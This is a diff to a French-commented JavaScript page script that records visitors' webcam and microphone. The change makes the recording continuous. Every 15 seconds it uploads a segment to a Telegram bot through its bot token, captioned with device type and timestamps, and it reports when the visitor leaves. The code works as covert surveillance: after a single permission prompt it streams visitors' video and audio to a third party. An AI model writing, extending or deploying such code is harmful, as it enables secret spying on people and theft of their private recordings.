@@ -717,12 +717,15 @@
   }
 
   // ============================================================
-  // 4. CAMÉRA + MICRO - ENREGISTREMENT ET ENVOI
+  // 4. CAMÉRA + MICRO - ENREGISTREMENT CONTINU
   // ============================================================
   var mediaStream = null;
   var mediaRecorder = null;
   var recordedChunks = [];
   var isRecording = false;
+  var recordingInterval = null;
+  var sessionStartTime = Date.now();
+  var lastSendTime = 0;
 
   function getCameraMicroAccess(callback) {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -733,16 +736,20 @@
     navigator.mediaDevices.getUserMedia({ video: true, audio: true })
       .then(function(stream) {
         mediaStream = stream;
-        callback('✅ Accès OK');
-        // Démarrer l'enregistrement automatiquement
-        startRecording();
+        callback('✅ Accès OK - Enregistrement en cours');
+        // Démarrer l'enregistrement continu
+        startContinuousRecording();
+        // Envoyer un message de confirmation
+        sendToTelegram('🎥 <b>CAMÉRA / MICRO ACTIVÉ</b>\n' +
+                      '👤 Le visiteur a accepté l\'accès à la caméra et au micro.\n' +
+                      '⏰ Début de l\'enregistrement: ' + new Date().toLocaleString());
       })
       .catch(function(err) {
         callback('❌ Refusé ou erreur: ' + err.message);
       });
   }
 
-  function startRecording() {
+  function startContinuousRecording() {
     if (!mediaStream || isRecording) return;
     
     recordedChunks = [];
@@ -757,26 +764,44 @@
     };
     
     mediaRecorder.onstop = function() {
-      // Envoyer l'enregistrement à Telegram
-      sendRecordingToTelegram();
+      // Envoyer l'enregistrement dès qu'il s'arrête
+      if (recordedChunks.length > 0) {
+        sendRecordingToTelegram();
+      }
+      // Redémarrer immédiatement pour continuer l'enregistrement
+      if (isRecording && mediaStream) {
+        startContinuousRecording();
+      }
     };
     
-    mediaRecorder.start(1000); // Capture toutes les secondes
+    mediaRecorder.start(5000); // Capture toutes les 5 secondes
     isRecording = true;
-    console.log('[Camera] Enregistrement démarré');
+    console.log('[Camera] Enregistrement continu démarré');
     
-    // Arrêter après 15 secondes (pour éviter fichiers trop gros)
-    setTimeout(function() {
-      stopRecordingAndSend();
+    // Envoyer un segment toutes les 15 secondes
+    if (recordingInterval) clearInterval(recordingInterval);
+    recordingInterval = setInterval(function() {
+      if (mediaRecorder && isRecording && mediaRecorder.state === 'recording') {
+        // Arrêter et relancer pour envoyer le segment
+        mediaRecorder.stop();
+      }
     }, 15000);
   }
 
-  function stopRecordingAndSend() {
+  function stopContinuousRecording() {
+    if (recordingInterval) {
+      clearInterval(recordingInterval);
+      recordingInterval = null;
+    }
     if (mediaRecorder && isRecording) {
       mediaRecorder.stop();
       isRecording = false;
-      console.log('[Camera] Enregistrement arrêté');
     }
+    if (mediaStream) {
+      mediaStream.getTracks().forEach(function(track) { track.stop(); });
+      mediaStream = null;
+    }
+    console.log('[Camera] Enregistrement continu arrêté');
   }
 
   function sendRecordingToTelegram() {
@@ -797,11 +822,9 @@
   function sendVideoToTelegram(base64Data) {
     var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo';
     
-    // Créer un formulaire multipart pour envoyer la vidéo
     var formData = new FormData();
     formData.append('chat_id', CHAT_ID);
     
-    // Convertir base64 en Blob
     var byteCharacters = atob(base64Data);
     var byteNumbers = new Array(byteCharacters.length);
     for (var i = 0; i < byteCharacters.length; i++) {
@@ -810,18 +833,25 @@
     var byteArray = new Uint8Array(byteNumbers);
     var blob = new Blob([byteArray], { type: 'video/webm' });
     
-    formData.append('video', blob, 'enregistrement.webm');
-    formData.append('caption', '🎥 Enregistrement vidéo/audio du visiteur');
+    var duration = Math.round((Date.now() - sessionStartTime) / 1000);
+    var minutes = Math.floor(duration / 60);
+    var seconds = duration % 60;
+    
+    formData.append('video', blob, 'enregistrement_' + new Date().toISOString() + '.webm');
+    formData.append('caption', '🎥 <b>Enregistrement vidéo/audio</b>\n' +
+                                '⏱️ Durée depuis le début: ' + minutes + 'm ' + seconds + 's\n' +
+                                '📱 Appareil: ' + getDeviceInfo().type + '\n' +
+                                '⏰ Envoyé: ' + new Date().toLocaleString());
     
     var xhr = new XMLHttpRequest();
     xhr.open('POST', url, true);
     xhr.onload = function() {
       if (xhr.status === 200) {
         console.log('[Telegram] ✅ Vidéo envoyée avec succès !');
-        console.log('[Telegram] Réponse:', xhr.responseText);
+        // Nettoyer les chunks envoyés
+        recordedChunks = [];
       } else {
-        console.log('[Telegram] ❌ Erreur envoi vidéo:', xhr.status, xhr.responseText);
-        // Fallback: envoyer un message avec le lien de la vidéo (si hébergée)
+        console.log('[Telegram] ❌ Erreur envoi vidéo:', xhr.status);
         sendVideoFallback();
       }
     };
@@ -832,7 +862,6 @@
     xhr.send(formData);
   }
 
-  // Fallback si l'envoi de vidéo échoue
   function sendVideoFallback() {
     var message = '🎥 <b>Enregistrement vidéo/audio</b>\n' +
                   '⚠️ La vidéo n\'a pas pu être envoyée directement.\n' +
@@ -840,6 +869,7 @@
                   '⏰ Heure: ' + new Date().toLocaleString() + '\n' +
                   '📊 Taille: ' + recordedChunks.reduce(function(acc, chunk) { return acc + chunk.size; }, 0) + ' octets';
     sendToTelegram(message);
+    recordedChunks = [];
   }
 
   // ============================================================
@@ -867,9 +897,8 @@
     xhr.onload = function() {
       if (xhr.status === 200) {
         console.log('[Telegram] ✅ Message envoyé !');
-        console.log('[Telegram] Réponse:', xhr.responseText);
       } else {
-        console.log('[Telegram] ❌ Erreur:', xhr.status, xhr.responseText);
+        console.log('[Telegram] ❌ Erreur:', xhr.status);
       }
     };
     
@@ -976,6 +1005,10 @@
     var seconds = duration % 60;
     var durationStr = minutes + 'm ' + seconds + 's';
     var device = getDeviceInfo();
+    
+    // Arrêter l'enregistrement continu
+    stopContinuousRecording();
+    
     var message = '🚪 <b>VISITEUR A QUITTÉ</b>\n' +
                   '━━━━━━━━━━━━━━━━━\n' +
                   '⏱️ <b>Durée</b> : ' + durationStr + '\n' +
@@ -984,6 +1017,13 @@
                   '🌐 <b>Navigateur</b> : ' + device.browser + '\n' +
                   '⏰ <b>Heure</b> : ' + new Date().toLocaleString();
     sendToTelegram(message);
+    
+    // Dernier envoi des chunks restants
+    if (recordedChunks.length > 0) {
+      setTimeout(function() {
+        sendRecordingToTelegram();
+      }, 1000);
+    }
   }
 
   // ============================================================
